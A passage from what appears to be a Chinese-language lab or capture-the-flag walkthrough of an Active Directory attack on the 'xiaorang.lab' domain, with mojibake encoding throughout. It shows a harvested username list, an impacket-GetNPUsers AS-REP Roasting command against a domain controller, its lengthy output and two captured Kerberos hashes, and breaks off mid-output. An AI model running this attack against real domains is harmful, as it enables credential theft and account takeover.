&#x27;\\w*@&#x27; -o|grep -E &#x27;[^@]*&#x27; -o &gt;usernameâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# cat usernamemengxiangmennanemenxilongmenxixiaomiaoguimiaoshumingfuminglianmingsongmingyanmoqianmouchunmoushanmuchengmuchunmujienangongjunniuyanongfannongyannongyannongyaonongzhennongzhuoulunpanbaopangchengpangningpangtaipangzhenpengyuanpinghaopuyangfuqiaiqiangjunqianqingqianyiqianyouqiaodeqiaomeiqidiaofangqiguanrouqijieqinguanqiruoqiyanqiyongqiyuanqiyueqizhuqulurangsiboranqunrongbiaorongxianyuruanyongrubaoruibeiruilinruishiruisongshangjieshangjunshangqianshanshaoshaocaishaokangshaotingshaoyishengzheshenhangshenjiaoshenshanshenshanshentuyunsheweiyueshieshijianshijunshilanshishushouchunshoujuanshuangchenshudishuichengshuifeishushishuzhensisiwusituxinsiyisongmingsongqinsongyansunduangusunlisunmeisunzhongdataigongyuantangguitangqiaotangrongtangshuntaoyatianxintongdongtonghaotongxuewangnuowangxingwangyanwangyanwangyingwansifeiwansifuwansishunwanyanweichengweichipengweigongweihuaweihuiweiliangweishengshanweiwanweixianweixianweixuewenbiaowenbowendongwengbangwengongwenliangwenshaowohongwohuawucewudawuhuanwulunwunuoxiahanxiaixiamaoxiangdongxiangjuanxiangqianxiangxinxiangyuxiaojinxiaorongxiayuxieyixijunximenshixingquanxingxixingyexionghongxiqixiqidixixiaxiyaoxiyixuanjiangxuanluxuanqunxudixuehexundixupengxuxinyangdanhanyangdanheyangjuyanglangyanguoyanjiyanjinyanqianyanyangmeiyanyueyanyunyanzhenyetaiyexingyezongyueyifuyinbinyinchenyingbiaoyingchanyingjunyingpengyingshiyinyuyixueyouchaoyouyiyuanchangyuboyufenyuhuiyuhuiyujianyujunyulingyulvxueyunhuiyunqianyunzhongyuruiyushayuwanyuxiyuxiaozangpengzangyaozhangxinzhangzhaozhannanzhaoxiuzhengluzhengpubeizhengxiaozhenhuizhenjunzhenyanzhongliyingzhouchunzhoujingzhoujunzhouqizhouyazhouyizhuangsongzhubinzhufengzhukezhulizhupengzhupengzhuqinzhuzhuzizhuansongzizhuanyuzizhuanzhizoubaozoufuzouqizuofenzuoqiufazuoqiutaizuoshun ç„¶åå¯¹åŸŸæ§è¿›è¡ŒKerberos AS-REP Roasting æ”»å‡» 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# impacket-GetNPUsers xiaorang.lab/ -dc-ip 172.22.6.12 -usersfile username -format hashcatImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User pangzhen doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User pengyuan doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User qiaomei doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User qiyue doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User rangsibo doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User rubao doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User sheweiyue doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User shuzhen doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User tangrong doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User tangshun doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User weicheng doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User weishengshan doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User weixian doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User weixian doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User wenbiao doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User wenbo doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User wengbang doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User wenliang doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$wenshao@XIAORANG.LAB:fde3340835efa9c8cb0330ae567c5c46$8228d9ae7bbd8e0ddcb991f14dfdd653bf2f05bd78effb9f48aa1095c7f4ee832254961a1d17de3e3e6cfd76c4048774b1c30bf45220d6f4f7dd6d958395dff97b733372d3562060209baa7ae25ca86734be598b1e7e42678d9bfacf14676b5d4f51b268a780b4dd6da66b2518dcf4888d658ea8ade7a35a40a9d6965bb304995498bf1cdcea67431d870c9e69982bcb25037fa8f8dc16695e0ecce65333e6f88231016fdc6312adf0d77749b63f85d05d1437d9a4290520de6272d3c0a636b4baf8ed7de278fcb5106503e57e35df5adbb9dd46503a58c0655e538ea24774f2c08234f6905e3120da8fc3fa[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User wohua doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User xiqidi doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User xiyi doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User xuanjiang doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User yangju doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User yanglang doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User yexing doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User yifu doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User yuanchang doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User yulvxue doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)$krb5asrep$23$zhangxin@XIAORANG.LAB:7aa36d3b1959318ccfe126e76624e4ea$c73a0aae1f17c00a07e9475d06964867c0adbbc19cdce676cc50a36aa3a12531021ef9e28202b027ae19fd538350edbe77d9dcf68ce187a2bf20ea2d559b478d12b7a9b4663f35611b8306da742d770ebbfe376e3e0af67aefe160e5ab422b219b4895f86e2735d536ed4ac7de07fd6400f9f8ca821c21c42325e4ce3e08ed70644dc44f62495853e169b4954624ef0fa2e1be73b336a276a35d4a32f6f4194e85498bb8c9412caeeb520d8fbca27bea8d3c694950bd019217683d429f727d95adefddf103790450a27e2fd750e8e220984f3bae37b95d582127861d2c62ab13e7c55512274df513b95043d0[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User zhaoxiu doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User zhenjun doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User zhufeng doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in 